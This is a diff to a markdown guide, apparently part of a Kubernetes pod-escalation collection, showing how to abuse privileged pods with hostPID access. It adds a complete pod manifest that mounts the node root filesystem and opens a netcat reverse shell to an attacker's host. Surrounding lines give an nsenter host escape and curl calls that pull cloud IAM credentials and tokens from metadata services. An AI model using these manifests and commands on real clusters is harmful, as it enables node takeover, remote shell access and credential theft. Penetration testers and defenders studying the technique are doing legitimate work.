@@ -4,7 +4,7 @@ If you have `privileged=true` and `hostPID` available to you, you can use the `n
 
 # Pod Creation
 
-### Create a pod you can exec into
+## Create a pod you can exec into
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -46,7 +46,35 @@ kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
 
-### Or, create a reverse shell pod
+## Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-everything-allowed-revshell
+  labels:
+    app: everything-allowed-revshell
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-revshell
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
 [pod-priv-and-hostpid-revshell.yaml](pod-priv-and-hostpid-revshell.yaml)
 
 #### Set up listener
@@ -118,7 +146,7 @@ If cloud hosted, look at the metadata service and checkout user-data, and the IA
 ```bash
 curl http://169.254.169.254/latest/user-data 
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/[account]/default/token
 ```
 
 Some other ideas:
